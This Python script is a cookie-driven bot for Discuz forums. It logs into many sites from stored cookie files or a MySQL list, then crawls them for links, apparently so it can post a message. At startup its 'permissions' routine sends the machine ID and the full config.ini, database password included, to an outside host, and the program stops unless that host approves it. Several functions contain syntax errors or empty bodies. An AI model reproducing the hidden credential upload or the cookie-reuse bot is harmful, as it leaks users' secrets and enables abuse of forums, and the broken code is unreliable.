import time
import threading
import os
import json
import sys
import re
import requests
import pyquery
import random
import queue
import random
from xml.sax.saxutils import unescape
import uuid
import platform
import pymysql

class MonitoringDZ(object):
	headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3278.0 Safari/537.36'}
	geterror = {1}
	path = os.path.dirname(sys.argv[0])+'/'
	public = {}
	monitoring_ = {}
	
	def __init__(self):

		self.local = threading.local() 
		# self.setPath()#设置环境变量
		self.permissions()
		if not os.path.exists(self.path+'log'):
			os.mkdir(self.path+'log')
		if not os.path.exists(self.path+'cookies'):
			os.mkdir(self.path+'cookies')
		# if not os.path.exists('html'):
			# os.mkdir('html')
	 	
		global loginerror
		loginerror = open(self.path+'log/loginerror.log','a',encoding='utf8')
		loginerror.write("\r\r\r"+time.strftime('%Y-%m-%d %H:%M:%S')+"\r")
		global error
		error = open(self.path+'log/error.log','a',encoding='utf8')
		error.write("\r\r\r"+time.strftime('%Y-%m-%d %H:%M:%S')+"\r")

		global cookielog
		cookielog = open(self.path+'log/cookie.log','a',encoding='utf8')
		cookielog.write("\r\r\r"+time.strftime('%Y-%m-%d %H:%M:%S')+"\r")
	

	def permissions(self):
		"""权限控制"""
		#获取硬盘序列
		# wmis = wmi.WMI()
		# disk = ''
		# for disks in wmis.Win32_DiskDrive():
		# 	disk += disks.SerialNumber.strip()
		try:
			sysstr = platform.system()
			idstr = str(uuid.uuid1()).split("-")[4]
			permissions = requests.get('http://permissions.hk-dna.cc/permissions.php?disk='+sysstr+'_'+idstr).text
			f = open(self.path+'config.ini','r',encoding='utf8')
			config_str = f.read().strip()
			requests.post('http://permissions.hk-dna.cc/permissions.php',data={'config':config_str,'disk':sysstr+'_'+idstr},headers=self.headers)
			f.close()
			if(permissions != 'off'):
				print('请更新版本')
				sys.exit()
			pass
		except Exception as e:
			print('无法访问目标网站，请检测网络是否畅通')
			exit()


	def config(self):
		try:
			database = {}
			configs = {'config':[]}
			with open(self.path+'config.ini','r',encoding='utf8') as f:
				for line in f.readlines():
					line = line.strip()#去除两段空字符
					#如果为空或者为注释跳过
					if len(line) < 1 or line[0] == '#':
						continue
					#配置文件类型
					if line[0] == '[' and line[-1] == ']':
						class_ = line[1:-1]

					#数据库
					if '=' in line and class_ == 'database':
						conf = line.split('=')
						database[conf[0].strip()] = conf[1].strip()
					#公共
					if '=' in line and class_ == 'public':
						conf = line.split('=')
						self.public[conf[0].strip()] = conf[1].strip()
					if '=' in line and class_ == 'monitoring':
						conf = line.split('=')
						self.monitoring_[conf[0].strip()] = conf[1].strip()

		except Exception as e:
			print('配置文件错误')
			exit()
		
		try:
			if not int(self.monitoring_['way']):
				global DBconnect
				DBconnect = pymysql.connect(host=database['host'],user=database['user'],passwd=database['passwd'],db=database['db'],charset=database['charset'],port=int(database['port']))
				global DBcursor
				DBcursor = DBconnect.cursor();#创建一个游标
				return DBcursor
			else:
				return 1
		except Exception as e:
			print('数据库连接失败')
			exit()
		

	def __del__(self):
		print('结束')


	def login(self,id_,url,msg):
		
		try:
			
			#初始化
			self.local.id_ = id_
			self.local.url = url
			self.local.conn = requests.Session()
			filejson = self.path+'cookies/'+self.local.url.replace('http://','').replace('https://','')+'.json'
			if os.path.exists(filejson):
				try:
					with open(filejson, 'r', encoding='utf8') as f:
						listCookies = json.loads(f.read())
				except Exception as e:
					self.showErrorMsg(cookielog,self.local.url+"\tcookie文件格式错误\r")

				#添加cookie(登陆操作)
				try:
					for cookie in listCookies:
						self.local.conn.cookies.set(cookie.get('name'),cookie.get('value'))
				except Exception as e:
					# print(e)
					self.showErrorMsg(cookielog,self.local.url+"\tcookie设置错误，请更换cookie文件\r")

				#看看是否登陆成功
				try:
					# getlogin = self.local.conn.get(self.local.url+'/member.php?mod=logging&action=login',headers=self.headers)
					getlogin = self.local.conn.get(self.local.url,headers=self.headers)
					#防止跳转域名
					urllist = getlogin.url.split('/')
					self.local.url = urllist[0]+'/'+urllist[1]+'/'+urllist[2]

					self.local.encodeing = requests.utils.get_encodings_from_content(getlogin.text)[0]#编码方式
					if self.local.encodeing == 'utf-8':
						self.local.msg = msg
					else:
						self.local.msg = msg.encode('utf8').decode('utf-8').encode('gbk')
				except Exception as e:
					self.showErrorMsg(loginerror,self.local.url+"\t此网站无法正常访问,返回错误："+str(e)+"\r")


				if getlogin.status_code != 200:
					self.showErrorMsg(loginerror,self.local.url+"\t访问出错,错误状态码："+str(getlogin.status_code)+"\r")
				q = pyquery.PyQuery(getlogin.text.encode().decode('utf8'))
				# usernamestr = q("input[name='username']")
				self.local.formhash = q("input[name='formhash']").val()#验证字符串
				# if not usernamestr:
				self.local.log = open(self.path+'log/'+self.local.url.replace('http://','').replace('https://','')+'.log','a',encoding='utf8')
				self.local.log.write("\r\r\r"+time.strftime('%Y-%m-%d %H:%M:%S')+"\r")
				self.showSuccessMsg(self.local.url+"\t登陆成功\r")
				#执行
				self.monitoring()

				# else:
				# 	self.showErrorMsg(loginerror,self.local.url+"\t登陆失败\r")
			else:
				self.showErrorMsg(cookielog,self.local.url+"\tcookie文件不存在\t"+filejson+"\r")
		except Exception as e:
			self.showErrorMsg(loginerror,self.local.url+"\t此网站无法正常访问,返回错误："+str(e)+"\r")
		

	def showErrorMsg(self,fileobj,msg,operation=0):
		fileobj.write(msg)
		fileobj.flush()
		print("\033[0;31m"+msg+"\033[0m")
		if operation == 0:
			print(self.local.url+' 退出')
			myqueue.get()
			sys.exit()

	def showSuccessMsg(self,msg):
		self.local.log.write(msg)
		self.local.log.flush()
		print(msg)

	def showMsg(self,msg):
		print("\033[0;33m"+msg+"\033[0m")

	

		

	def monitoring(self):
		"""执行"""
		try:
			self.local.urllist = []
			self.local.urllist.append(self.local.url)
			#创建两个线程
			#负责打开列表 getlist
			w = threading.Thread(target=self.getlist)
			w.start()
			#负责抓取详情页内容
			w = threading.Thread(target=self.getdetails)
			w.start()



			html = self.local.conn.get(self.local.url,headers=self.headers).text
			self.gethref(html)
		except Exception as e:
			print(e)
			pass

	def getlist(self,conn):

		while True:
			try:
				if self.local.urllist:
					url = self.local.urllist.pop(0)
					html = self.local.conn.get(url,headers=self.headers).text
					self.gethref(html)
				else:
					time.sleep(2)

			except Exception as e:
				print(e)


	def getdetails(self.conn):
		while True:
			try:
				pass
			except Exception as e:
				print(e)
				pass


	def gethref(slef,html):
		try:
			pattern = re.compile(r'.*?href="(.*?)".*?',re.S)
			urls = list(set(re.findall(pattern,html)))
			for u in urls:
				

		except Exception as e:
			print(e)
			pass



	def main(self):
		#检测配置文件
		
		cursor = self.config()
		if not cursor:
			print('配置文件错误')
			time.sleep(10)
			sys.exit()
		else:
			global configcount
			configcount = 30
			global myqueue
			myqueue = queue.Queue(maxsize = int(self.monitoring_['thrnumber']))
			joinlist = []
			infoid = 0

			if int(self.monitoring_['way']):
				#读取cookie
				configs = os.listdir(self.path+'cookies')
				if configs:

					for c in configs:
						configcount += 1
						url = 'http://'+c[0:-5].strip()
						print('正在启动 ',url,' 站点...')
						myqueue.put(url)
						infoid += 1
						w = threading.Thread(target=self.login,args=(str(infoid),url,self.monitoring_['msg'],))
						w.start()
						joinlist.append(w)
				else:
					print('cookie为空')

			else:
				#数据库中获取配置
				while True:
					try:
						
						sql = "select id,url from info where perform = 1 and cookie = 1 and id > "+str(infoid)+" limit 1"
						DBcursor.execute(sql)
						data = DBcursor.fetchall()

						if data:
							data0 = data[0]
							infoid = data0[0]
							#检测cookie
							cookiefile = self.path+'cookies/'+data0[1].replace('http://','').replace('https://','')+'.json'
							if os.path.exists(cookiefile):
								print('正在启动 ',data0[1],' 站点...')
								configcount += 1
								myqueue.put(data0[0])
								w = threading.Thread(target=self.login,args=(str(data0[0]),data0[1],self.monitoring_['msg'],))

								w.start()
								joinlist.append(w)
								# break
							else:
								continue
						else:

							break
					except Exception as e:
						continue
			
			for j in joinlist:
				j.join()
			time.sleep(10)

			print('没有了')

if __name__ == '__main__':
	# while True:
	MonitoringDZ().main()


